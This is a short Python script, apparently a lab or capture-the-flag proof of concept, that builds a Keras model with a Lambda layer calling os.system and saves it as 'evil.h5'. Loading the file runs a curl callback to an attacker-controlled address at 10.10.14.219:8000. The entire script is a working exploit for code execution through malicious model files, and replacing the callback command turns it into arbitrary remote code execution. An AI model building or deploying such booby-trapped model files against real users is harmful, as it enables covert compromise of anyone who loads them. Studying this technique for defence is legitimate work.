import os
import tensorflow as tf
from tensorflow.keras.models import Model
from tensorflow.keras.layers import Input, Lambda

CALLBACK = "curl -s http://10.10.14.219:8000/pwned >/dev/null"

def payload(x):
    try:
        os.system(CALLBACK)
    except Exception:
        pass
    return x

inp = Input(shape=(1,), name='inp')
out = Lambda(payload)(inp)
model = Model(inp, out)
out_path = os.path.abspath(os.path.join(os.path.dirname(__file__), 'evil.h5'))
model.save(out_path, include_optimizer=False)
print('[+] Wrote', out_path)
